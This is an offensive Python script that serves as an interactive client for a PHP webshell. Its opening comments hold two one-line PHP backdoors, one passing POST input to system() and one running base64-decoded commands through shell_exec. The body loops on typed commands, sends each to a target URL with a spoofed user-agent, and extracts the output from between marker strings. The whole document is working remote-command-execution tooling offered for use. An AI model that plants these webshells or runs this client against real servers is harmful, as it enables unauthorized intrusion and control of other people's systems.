#!/usr/bin/python
# Use with this php webshell:
# abcdef666 <?php echo system($_POST['cmd']); ?> abcdef666
#
# Or use base64 with:
# abcdef666 <?php $c=shell_exec(base64_decode($_POST['cmd'])); echo base64_encode($c);?> abcdef666
 
import sys
import requests
#import base64

magic_string = "abcdef666"

def find_between( s, match ):
 try:
  start = s.index( match ) + len( match )
  end   = s.index( match, start )
  return s[start:end]
 except ValueError:
  return ""
 
url = sys.argv[1]
print "[+] Connecting to webshell client ..."
 
while True:
    comm = raw_input("~$ ")
    if comm == "quit":
        break

    # Uncomment below for base64
    # comm = base64.b64encode(comm)
    headers = {'user-agent':'Mozilla/4.0'}
    # Uncomment below for proxy
    #proxy = {'http':'http://127.0.0.1:8080'}
    #data = {'cmd' : comm + " 2>&1"}
    data = {'cmd' : comm}
    try:
        # Uncomment below for proxy
        #r=requests.post(url, headers=headers, proxies=proxy, data=data)
        r=requests.post(url, headers=headers, data=data)
    except:
        print "ERROR: Exception during request"
        continue

    resp = find_between(r.text, magic_string)
    # Uncomment below for base64
    #resp = base64.b64decode(resp)
    print resp
